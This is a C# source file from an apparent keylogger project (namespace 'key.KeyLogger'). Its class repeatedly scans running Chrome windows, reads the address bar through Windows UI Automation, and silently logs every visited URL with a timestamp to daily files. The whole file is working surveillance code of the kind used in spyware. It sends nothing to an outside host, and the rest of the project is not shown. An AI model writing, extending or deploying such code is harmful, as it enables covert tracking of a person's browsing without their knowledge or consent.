using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Automation;

namespace key.KeyLogger
{
    public class BrowserItem
    {
        public string BrowserName { get; set; }
        public string Url { get; set; }
        public string TimeEx { get; set; }
    }
    public class GetURLfromChrome
    {
        private static GetURLfromChrome _Instance;

        public static GetURLfromChrome Instance
        {
            get
            {
                if (_Instance == null)
                {
                    _Instance = new GetURLfromChrome();
                }
                return _Instance;
            }
            private set
            {

            }
        }
        public GetURLfromChrome() { 
        }

        List<BrowserItem> bi = new List<BrowserItem>();
        public void ClearList()
        {
            bi.Clear();
        }

        static void WriteLog(string process)
        {
            API.CreateFolderText();
            API.CreateFolderDay();
            string logNameToWrite = API.FolderDay + "/" + API.GetURLfromChrome + API.logExtendtion;
            StreamWriter sw = new StreamWriter(logNameToWrite, true);
            sw.Write(process);
            sw.Close();
        }


        public bool ListAndCheck(BrowserItem a)
        {
            bool check = false;
            bi.Add(a);
            if (bi.Count == 1 || bi[bi.Count - 2].Url != bi[bi.Count - 1].Url) check = true;
            else
            {
                var duplicateExists = bi.Where(x => x.BrowserName == a.BrowserName && x.Url == a.Url).Count();
                if (bi[bi.Count - 2].Url == bi[bi.Count - 1].Url)
                {
                    check = false;
                }
                else
                {
                    check = true;
                }
            }
            return check;
        }

        public void Checkurl()
        {
            while(true)
            {
                try
                {
                    Process[] procsChrome = Process.GetProcessesByName("chrome");
                    if (procsChrome.Length <= 0)
                    {
                        //Console.WriteLine("Chrome is not running");
                    }
                    else
                    {
                        foreach (Process proc in procsChrome)
                        {
                            // the chrome process must have a window
                            if (proc.MainWindowHandle == IntPtr.Zero)
                            {
                                continue;
                            }
                            AutomationElement root = AutomationElement.FromHandle(proc.MainWindowHandle);
                            AutomationElement SearchBar = root.FindFirst(TreeScope.Descendants, new PropertyCondition(AutomationElement.NameProperty, "Address and search bar"));
                            Dictionary<string, string> dictionary = new Dictionary<string, string>();
                            if (SearchBar != null)
                            {
                                //List<string> arrayURL = new List<string>();
                                dictionary["BrowserName"] = "Google Chrome";
                                dictionary["Url"] = (string)SearchBar.GetCurrentPropertyValue(ValuePatternIdentifiers.ValueProperty);
                                dictionary["TimeEx"] = DateTime.Now.ToString("dd-MM-yyyy hh::mm::ss tt");
                                string Browserst = "";
                                if (dictionary["Url"] == "")
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + "New Tab";
                                }
                                else
                                {
                                    Browserst = dictionary["BrowserName"] + " " + dictionary["TimeEx"] + " " + dictionary["Url"];
                                }
                                BrowserItem bri = new BrowserItem { BrowserName = dictionary["BrowserName"], Url = dictionary["Url"], TimeEx = dictionary["TimeEx"] };
                                if (ListAndCheck(bri) == true)
                                {
                                    //Console.WriteLine();
                                    Console.WriteLine("" + Browserst + "\n");
                                    WriteLog("" + Browserst + "\n");
                                    //sw.WriteLine("\n" + Browserst);
                                }
                            }

                        }
                    }
                }
                catch (Exception ex)
                {
                    ex.ToString();
                }
            }
            
        }
    }
}
